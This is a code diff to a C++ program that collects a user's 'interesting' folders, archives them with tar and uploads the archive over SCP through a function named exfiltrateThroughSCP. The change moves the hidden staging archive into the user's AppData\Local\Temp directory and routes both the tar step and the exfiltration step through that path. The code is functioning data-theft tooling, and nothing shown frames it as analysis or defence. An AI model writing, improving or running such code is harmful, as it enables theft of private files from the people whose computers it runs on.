@@ -58,8 +58,8 @@ string selectCompressionTool() {
     return NULL;
 }
 
-void windowsTar(vector<string> directories) {
-    string command = "tar -cvzf D:\\tmp\\rk3824.tar " + join(directories, " ");
+void windowsTar(vector<string> directories, string destination) {
+    string command = "tar -cvzf " + destination + " " + join(directories, " ");
     cout << "Command is " << command<<endl;
     CommandResult result = Command::exec(command);
 }
@@ -81,10 +81,11 @@ int main()
         }
         printVectorString(interestingUserFoldersFullPath);
         string compressionTool = selectCompressionTool();
+        string fullPath = wchar2string(path) + "\\AppData\\Local\\Temp\\rk3824.tar";
         cout << compressionTool << endl;
         if (compressionTool == "tar.exe") {
-            windowsTar(interestingUserFoldersFullPath);
+            windowsTar(interestingUserFoldersFullPath, fullPath);
         }
-        exfiltrateThroughSCP("D:\\tmp\\rk3824.tar", "landing/rk3824.tar");
+        exfiltrateThroughSCP(fullPath, "landing/rk3824.tar");
     }
 }
